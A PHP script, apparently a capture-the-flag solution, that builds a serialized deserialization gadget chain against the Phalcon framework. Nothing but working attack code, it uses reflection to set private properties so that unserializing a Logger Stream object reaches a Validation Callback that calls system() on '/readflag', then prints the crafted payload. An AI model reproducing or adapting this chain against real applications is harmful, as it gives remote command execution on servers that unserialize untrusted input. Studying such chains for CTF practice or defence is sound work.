<?php

function cp ($object, $property, $value)
{
    $a = new ReflectionClass($object);
    $b = $a->getProperty($property);
    $b->setAccessible(true);
    $b->setValue($object, $value);
}

use Phalcon\Loader;

$s = new Phalcon\Di\Service(
	[
		"className" => \Phalcon\Validation::class,
		"arguments" => [],
		"calls" => [
			[
				"method" => "add",
				"arguments" => [
					[
						"type" => "parameter",
					 	"value" => [""]
					],
					[
						"type" => "parameter",
					 	"value" => new \Phalcon\Validation\Validator\Callback(
					        [
					            "message" => "",
					            "callback" => "system"
					        ]
					 	)
					]
				]
			],
			[
				"method" => "validate",
				"arguments" => [
					[
						"type" => "parameter",
					 	"value" => new Phalcon\Acl\Component("/readflag")
					]
				]
			],

		]
	], false);
$di = new Phalcon\Di();
//$di->set('context', Phalcon\DataMapper\Pdo\Connection::class, true);

cp($di, 'services', [
	'context' => $s
]);

//cp($di, 'eventsManager', []);
$item = new Phalcon\Logger\Item('', 1, 1, 0, [$di]);

$logger = new \Phalcon\Logger\Adapter\Stream("/tmp/1.txt");
cp($logger, 'inTransaction', true);
cp($logger, 'defaultFormatter', 'Json');
cp($logger, 'queue', [$di]);

$a = serialize($logger);

$a = preg_replace_callback('/s:(\d+):"\x00(.*?)\x00/', function ($a) {
    return 's:' . ((int)$a[1] - strlen($a[2]) - 2) . ':"';
}, $a);
var_dump($a);

exit;